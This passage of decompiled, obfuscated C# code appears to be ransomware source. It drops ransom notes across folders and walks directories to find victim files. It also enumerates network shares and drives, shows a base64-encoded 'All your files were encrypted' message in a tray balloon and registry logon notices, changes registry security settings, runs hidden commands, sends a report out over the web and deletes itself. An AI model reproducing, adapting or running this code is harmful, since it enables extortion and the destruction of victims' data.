		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395683)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395683));
				streamWriter.WriteLine(hcAHXMuOvto(getString_0(107395650)));
				streamWriter.WriteLine(getString_0(107396570));
				streamWriter.WriteLine(hcAHXMuOvto(getString_0(107390272)));
				streamWriter.WriteLine(WKjyaCaelLg);
				if (ZYTlzkdcoENHWE == getString_0(107397060))
				{
					streamWriter.WriteLine(getString_0(107396570));
					streamWriter.WriteLine(hcAHXMuOvto(getString_0(107390239)) + Convert.ToString(kQacklGScvGB.Count));
				}
				if (izNvindkdEa)
				{
					streamWriter.WriteLine(getString_0(107396570));
					streamWriter.WriteLine(hcAHXMuOvto(getString_0(107390194)));
					streamWriter.WriteLine(PRbKLyXwxCMy.jcnSxDGjlUW());
				}
			}
			else
			{
				string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395683));
				if (!text11.Contains(WKjyaCaelLg) && !TTTJwfHUqgyKmj)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395683), getString_0(107390161) + WKjyaCaelLg);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in XhCnheiZHlf)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395683)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395683), item + getString_0(107395683), overwrite: true);
				}
				else
				{
					string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395683));
					if (!text12.Contains(WKjyaCaelLg) && !TTTJwfHUqgyKmj)
					{
						File.AppendAllText(item + getString_0(107395683), getString_0(107390161) + WKjyaCaelLg);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!mDwgaDNBNLVR && num > 10)
			{
				break;
			}
		}
		if (bhpkuvVWHsXIIU == getString_0(107396771))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390100)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390100));
					streamWriter2.WriteLine(hcAHXMuOvto(getString_0(107390099)));
					streamWriter2.WriteLine(getString_0(107396570));
					streamWriter2.WriteLine(hcAHXMuOvto(getString_0(107390562)));
					streamWriter2.WriteLine(WKjyaCaelLg + hcAHXMuOvto(getString_0(107390505)));
					if (ZYTlzkdcoENHWE == getString_0(107397060))
					{
						streamWriter2.WriteLine(getString_0(107396570));
						streamWriter2.WriteLine(hcAHXMuOvto(getString_0(107390460)) + hcAHXMuOvto(getString_0(107390239)) + Convert.ToString(kQacklGScvGB.Count) + hcAHXMuOvto(getString_0(107390505)));
					}
					if (izNvindkdEa)
					{
						streamWriter2.WriteLine(getString_0(107396570));
						streamWriter2.WriteLine(hcAHXMuOvto(getString_0(107390194)));
						streamWriter2.WriteLine(PRbKLyXwxCMy.jcnSxDGjlUW());
					}
				}
				else
				{
					string text13 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395683));
					if (!text13.Contains(WKjyaCaelLg) && !TTTJwfHUqgyKmj)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390100), hcAHXMuOvto(getString_0(107390460)) + getString_0(107390161) + WKjyaCaelLg + hcAHXMuOvto(getString_0(107390505)));
					}
				}
			}
			catch
			{
			}
		}
		if (tVQlXTzRozdw == getString_0(107396771))
		{
			try
			{
				if (ZYTlzkdcoENHWE == getString_0(107397060))
				{
					PRbKLyXwxCMy.hOcDfzmVsDaOYQZ(getString_0(107390399), getString_0(107390394), getString_0(107390413), string.Concat(hcAHXMuOvto(getString_0(107396636)), new WebClient().DownloadString(hcAHXMuOvto(getString_0(107396611))), getString_0(107390404), hcAHXMuOvto(getString_0(107396565)), DateTime.Now, getString_0(107396570), hcAHXMuOvto(getString_0(107390367)), Convert.ToString(kQacklGScvGB.Count), getString_0(107396570), hcAHXMuOvto(getString_0(107396556)), WKjyaCaelLg));
				}
				else
				{
					PRbKLyXwxCMy.hOcDfzmVsDaOYQZ(getString_0(107390399), getString_0(107390394), getString_0(107390413), string.Concat(hcAHXMuOvto(getString_0(107396636)), new WebClient().DownloadString(hcAHXMuOvto(getString_0(107396611))), getString_0(107390404), hcAHXMuOvto(getString_0(107396565)), DateTime.Now, getString_0(107396570), hcAHXMuOvto(getString_0(107390367)), Convert.ToString(kQacklGScvGB.Count), getString_0(107396570), hcAHXMuOvto(getString_0(107396556)), WKjyaCaelLg));
				}
			}
			catch
			{
			}
		}
		if (vOZUFdRPio == getString_0(107396771))
		{
			try
			{
				QQYfKnZoSzhgHZV.bPdxRVScMCRJRYk(new Uri(getString_0(107390350)));
			}
			catch
			{
			}
		}
		if (bhpkuvVWHsXIIU == getString_0(107397060))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395683)))
				{
					Process.Start(hcAHXMuOvto(getString_0(107390349)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395683));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390100)))
				{
					Process.Start(hcAHXMuOvto(getString_0(107389780)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390100));
				}
			}
			catch
			{
			}
		}
		if (ynfNInlWMPbmP == getString_0(107396771))
		{
			if (KYTtjmbrnwcoW == getString_0(107396771) && !string.IsNullOrEmpty(QoEJlIRixuXy) && !string.IsNullOrEmpty(IhGhEkurggvV))
			{
				XETfblyPMVZBmoWJa(QoEJlIRixuXy, IhGhEkurggvV);
			}
			else
			{
				XETfblyPMVZBmoWJa(getString_0(107389763), getString_0(107389766));
			}
		}
		if (VuBpwpfFQIC != getString_0(107390012))
		{
			icSduPeGyUgQB(VuBpwpfFQIC);
		}
		if (!string.IsNullOrEmpty(YGuCHWMRhhcSxPX))
		{
			try
			{
				File.Delete(YGuCHWMRhhcSxPX);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397200))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397200)));
			}
		}
		catch (Exception ex18)
		{
			try
			{
				File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107390027) + ex18.Message);
			}
			catch (Exception)
			{
			}
		}
		if (YGBzDBzlDVGPdcyT)
		{
			try
			{
				File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107389950));
			}
			catch (Exception)
			{
			}
		}
		if (VtHzXiXBnEZtf == getString_0(107389969))
		{
			pQMSgvLMPHjEGO();
		}
	}

	public static void rcFNAOatOm()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(hcAHXMuOvto(getString_0(107389960)), hcAHXMuOvto(getString_0(107389763)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int auYTntIUHozrxD(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> ChLnyfZaoJcdH(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107389294)) && !text.Contains(getString_0(107389237)) && !text.Contains(getString_0(107389204)) && !text.ToLower().Contains(getString_0(107389187)) && !text.ToLower().Contains(getString_0(107389174)) && !text.Contains(getString_0(107389149)) && !text.Contains(getString_0(107389160)) && !text.ToLower().Contains(getString_0(107389115)) && !text.ToLower().Contains(getString_0(107389134)) && !text.ToLower().Contains(getString_0(107389097)) && !text.ToLower().Contains(getString_0(107389056)) && !text.ToLower().Contains(getString_0(107389071)) && !text.ToLower().Contains(getString_0(107389538)) && !text.ToLower().Contains(getString_0(107389525)) && !text.ToLower().Contains(getString_0(107389504)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107389511)) && !fileInfo.FullName.Contains(getString_0(107389462)) && !fileInfo.FullName.Contains(getString_0(107389477)) && !fileInfo.FullName.Contains(getString_0(107389428)) && !fileInfo.FullName.Contains(getString_0(107389411)) && !fileInfo.FullName.Contains(getString_0(107389426)) && !fileInfo.FullName.Contains(getString_0(107389377)) && !fileInfo.FullName.Contains(getString_0(107389392)) && !fileInfo.FullName.Contains(getString_0(107389347)) && !fileInfo.FullName.Contains(getString_0(107389358)) && !fileInfo.FullName.ToLower().Contains(getString_0(107389313)) && !fileInfo.FullName.ToLower().Contains(getString_0(107389300)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388771)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388786)) && !fileInfo.FullName.Contains(hcAHXMuOvto(getString_0(107388737))) && !fileInfo.FullName.Contains(getString_0(107388744)) && !fileInfo.FullName.Contains(getString_0(107397200)) && !fileInfo.FullName.Contains(getString_0(107388699)) && !fileInfo.FullName.EndsWith(getString_0(107395237)) && !fileInfo.FullName.EndsWith(getString_0(107388674)) && !fileInfo.FullName.EndsWith(getString_0(107388669)) && !fileInfo.FullName.EndsWith(getString_0(107388664)) && !fileInfo.FullName.EndsWith(getString_0(107388691)) && !fileInfo.FullName.Contains(getString_0(107388686)) && !fileInfo.FullName.Contains(vyePyvbVLbeEqa) && !fileInfo.FullName.Contains(ZmxznfzcMXVgTR) && !fileInfo.FullName.Contains(xrvDxaCBctsjEXT))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(GpINWHpOESmKHe) * 1024.0 * 1024.0 && RitzjDPaNqQZW == getString_0(107396771))
						{
							list.Add(fileInfo.FullName);
							LWlPHDDyRXHVip(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && RitzjDPaNqQZW == getString_0(107397060))
						{
							list.Add(fileInfo.FullName);
							LWlPHDDyRXHVip(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void EIwysPYolVQ()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107388637));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!apDawShQCtslB.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388616), getString_0(107397173)).Replace(getString_0(107388579), getString_0(107388616))
					.Replace(getString_0(107388570), getString_0(107390350))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					apDawShQCtslB.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388616), getString_0(107397173)).Replace(getString_0(107388579), getString_0(107388616))
						.Replace(getString_0(107388570), getString_0(107390350))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107388565), getString_0(107390350)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string rNfIJaiTMyCx(string AHxODDuEmCa = "", string GVcQJWQZdpdpqN = "")
	{
		string result = getString_0(107390350);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = AHxODDuEmCa,
				Arguments = GVcQJWQZdpdpqN,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void nGhdvVidhDbL(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107388588),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string BSskXttzziY(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string hcAHXMuOvto(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void VMhFvFUiMA(string PyrrApWbHFp = "", string HDZnuKxBnKZD = "SW5mb3JtYXRpb24uLi4=", string PpBtKfSjnLR = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		PyrrApWbHFp = BSskXttzziY(getString_0(107388539));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(hcAHXMuOvto(PyrrApWbHFp), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(hcAHXMuOvto(getString_0(107388954)), hcAHXMuOvto(HDZnuKxBnKZD));
				registryKey.SetValue(hcAHXMuOvto(getString_0(107388921)), hcAHXMuOvto(PpBtKfSjnLR));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			PyrrApWbHFp = BSskXttzziY(getString_0(107388892));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(hcAHXMuOvto(PyrrApWbHFp), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(hcAHXMuOvto(getString_0(107388819)), hcAHXMuOvto(HDZnuKxBnKZD));
				registryKey.SetValue(hcAHXMuOvto(getString_0(107388274)), hcAHXMuOvto(PpBtKfSjnLR));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void LgkYyRNqrYEXQm()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (KYTtjmbrnwcoW == getString_0(107396771) && !string.IsNullOrEmpty(QoEJlIRixuXy) && !string.IsNullOrEmpty(IhGhEkurggvV))
				{
					VMhFvFUiMA(getString_0(107390350), QoEJlIRixuXy, IhGhEkurggvV);
				}
				else
				{
					VMhFvFUiMA(getString_0(107390350), getString_0(107389763), getString_0(107389766));
				}
			}
		}
		catch
		{
		}
	}

	public static void XETfblyPMVZBmoWJa(string fTNQMjETpVtY = "SW5mb3JtYXRpb24uLi4=", string oiVwCiNApSQWbs = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(hcAHXMuOvto(fTNQMjETpVtY));
		val.set_BalloonTipText(hcAHXMuOvto(oiVwCiNApSQWbs));
		val.ShowBalloonTip(30000);
	}

	public static void icSduPeGyUgQB(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		rNfIJaiTMyCx(hcAHXMuOvto(getString_0(107388213)), getString_0(107388228) + text + getString_0(107388187) + string_0);
	}

	private static void TSXSEaOaMSG()
	{
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Expected O, but got Unknown
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_0287: Expected O, but got Unknown
		nFBQOHQpvKk();
		List<bwkStIDKDeY> list = bwkStIDKDeY.TQTcsohCeyCATQ();
		foreach (bwkStIDKDeY item in list)
		{
			iXuYDVfYyJk.Add(item.IPAddress);
		}
		List<string> source = iXuYDVfYyJk;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a = delegate(string string_0)
			{
				smbJHwQJoYcG CS_0024_003C_003E8__locals0 = new smbJHwQJoYcG();
				CS_0024_003C_003E8__locals0.ZHWSlOCXcEDLfk = string_0;
				if ((!CS_0024_003C_003E8__locals0.ZHWSlOCXcEDLfk.StartsWith(getString_0(107386398)) && !CS_0024_003C_003E8__locals0.ZHWSlOCXcEDLfk.StartsWith(getString_0(107386393)) && !CS_0024_003C_003E8__locals0.ZHWSlOCXcEDLfk.StartsWith(getString_0(107386416)) && !CS_0024_003C_003E8__locals0.ZHWSlOCXcEDLfk.StartsWith(getString_0(107386416))) || !vdyuMWvrJcM.naNRsxJGxBow(CS_0024_003C_003E8__locals0.ZHWSlOCXcEDLfk))
				{
					return;
				}
				try
				{
					Thread.Sleep(RmKdlhAIesG);
					apDawShQCtslB.Add(getString_0(107388616) + CS_0024_003C_003E8__locals0.ZHWSlOCXcEDLfk + getString_0(107386371));
					try
					{
						if (zZWgofEFsLDUuOW)
						{
							Console.WriteLine(getString_0(107388616) + CS_0024_003C_003E8__locals0.ZHWSlOCXcEDLfk + getString_0(107386371));
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int int_0)
					{
						Thread.Sleep(RmKdlhAIesG);
						apDawShQCtslB.Add(smbJHwQJoYcG.getString_0(107388622) + CS_0024_003C_003E8__locals0.ZHWSlOCXcEDLfk + smbJHwQJoYcG.getString_0(107397179) + (char)int_0 + smbJHwQJoYcG.getString_0(107402545));
						try
						{
							if (zZWgofEFsLDUuOW)
							{
								Console.WriteLine(smbJHwQJoYcG.getString_0(107388622) + CS_0024_003C_003E8__locals0.ZHWSlOCXcEDLfk + smbJHwQJoYcG.getString_0(107397179) + (char)int_0 + smbJHwQJoYcG.getString_0(107402545));
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a);
		try
		{
			vdyuMWvrJcM.BwZpMQgmQfMNqX bwZpMQgmQfMNqX = new vdyuMWvrJcM.BwZpMQgmQfMNqX(vdyuMWvrJcM.kZwYwEMWDsvD.PmqtOoPklXL, vdyuMWvrJcM.aPJyievxEcXK.BRixiFIUbhMlSB, vdyuMWvrJcM.ZuJJtWANzVEbPf.xaJpSGYniUkl, vdyuMWvrJcM.OnwKRjhGZDxQG.QfMSEEXUSdSw);
			foreach (string item2 in bwZpMQgmQfMNqX)
			{
				MatchCollection matchCollection = Regex.Matches(item2, getString_0(107388182));
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!apDawShQCtslB.Contains(item3.ToString()))
						{
							apDawShQCtslB.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (zZWgofEFsLDUuOW)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		muHyOjnVEdWDRoA.ouferLyNcmo();
		try
		{
			if (zZWgofEFsLDUuOW)
			{
				Console.WriteLine(getString_0(107388133));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = BSskXttzziY(getString_0(107388892));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(hcAHXMuOvto(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(hcAHXMuOvto(getString_0(107388060)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(hcAHXMuOvto(getString_0(107388515)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (gTZuLexkwyqfA == getString_0(107396771))
		{
			qcDZbcRUYPZiV.FoJoGQSEkxis();
		}
		try
		{
			if (zZWgofEFsLDUuOW)
			{
				Console.WriteLine(getString_0(107388470));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107388637));
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (apDawShQCtslB.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388616), getString_0(107397173)).Replace(getString_0(107388579), getString_0(107388616))
					.Replace(getString_0(107388570), getString_0(107390350))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (zZWgofEFsLDUuOW)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388616), getString_0(107397173)).Replace(getString_0(107388579), getString_0(107388616))
							.Replace(getString_0(107388570), getString_0(107390350))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107388565), getString_0(107390350)));
					}
				}
				catch
				{
				}
				apDawShQCtslB.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388616), getString_0(107397173)).Replace(getString_0(107388579), getString_0(107388616))
					.Replace(getString_0(107388570), getString_0(107390350))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107388565), getString_0(107390350)));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (zZWgofEFsLDUuOW)
			{
				Console.WriteLine(getString_0(107388413));
			}
		}
		catch
		{
		}
	}

	public static bool GbgzAXwzTuZOIzm()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107388344));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void COmUeYeonfEGhi(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = hcAHXMuOvto(getString_0(107388311));
		processStartInfo.Arguments = getString_0(107388282) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool aPIhDICFGSi(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool lGlbRPbkYb(string string_0)
	{
		try
		{
			viFMLSLcEXwpNj CS_0024_003C_003E8__locals0 = new viFMLSLcEXwpNj();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.VjJzqQkJlyFL = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.VjJzqQkJlyFL);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107388277);
		}
		catch
		{
			return false;
		}
	}

	public static void tEjJZEmrPPLY()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = BSskXttzziY(getString_0(107388300));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(hcAHXMuOvto(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(hcAHXMuOvto(getString_0(107387618)));
					registryKey.DeleteSubKey(hcAHXMuOvto(getString_0(107387625)));
					registryKey.DeleteSubKey(hcAHXMuOvto(getString_0(107387576)));
					registryKey.DeleteSubKey(hcAHXMuOvto(getString_0(107387551)));
					registryKey.DeleteSubKey(hcAHXMuOvto(getString_0(107388311)));
					registryKey.DeleteSubKey(hcAHXMuOvto(getString_0(107387558)));
					registryKey.DeleteSubKey(hcAHXMuOvto(getString_0(107388213)));
					registryKey.Close();
				}
				string_ = BSskXttzziY(getString_0(107387529));
				registryKey = Registry.LocalMachine.OpenSubKey(hcAHXMuOvto(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(hcAHXMuOvto(getString_0(107387944)));
					registryKey.Close();
				}
				string_ = BSskXttzziY(getString_0(107387895));
				registryKey = Registry.LocalMachine.OpenSubKey(hcAHXMuOvto(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(hcAHXMuOvto(getString_0(107387944)));
					registryKey.Close();
				}
				string_ = BSskXttzziY(getString_0(107387895));
				registryKey = Registry.CurrentUser.OpenSubKey(hcAHXMuOvto(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(hcAHXMuOvto(getString_0(107387944)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			rNfIJaiTMyCx(hcAHXMuOvto(getString_0(107387910)), hcAHXMuOvto(getString_0(107387861)));
			rNfIJaiTMyCx(hcAHXMuOvto(getString_0(107387844)), hcAHXMuOvto(BSskXttzziY(getString_0(107387803))));
			rNfIJaiTMyCx(hcAHXMuOvto(getString_0(107387844)), hcAHXMuOvto(getString_0(107387177)));
			rNfIJaiTMyCx(hcAHXMuOvto(getString_0(107387116)), hcAHXMuOvto(getString_0(107387067)));
		}
		catch
		{
		}
	}

	public static void TnxDxZQzabkSS(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(hcAHXMuOvto(getString_0(107387026)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void lMnoQYsugktngh()
	{
		string string_ = BSskXttzziY(getString_0(107387481));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(hcAHXMuOvto(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(hcAHXMuOvto(getString_0(107387432)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void nFBQOHQpvKk()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			rNfIJaiTMyCx(hcAHXMuOvto(getString_0(107387399)), hcAHXMuOvto(getString_0(107387354)));
			rNfIJaiTMyCx(hcAHXMuOvto(getString_0(107387399)), hcAHXMuOvto(getString_0(107386712)));
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string sWsRnVdvMz(string vMvadwIQOgQXE, int CjWiDdCYuGVlj = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(CjWiDdCYuGVlj);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(vMvadwIQOgQXE, 1, intPtr, ref CjWiDdCYuGVlj) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void pQMSgvLMPHjEGO()
	{
		rNfIJaiTMyCx(getString_0(107396309), hcAHXMuOvto(getString_0(107386598)));
		string text = hcAHXMuOvto(getString_0(107386916));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107388570) + text + getString_0(107388570) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396309);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

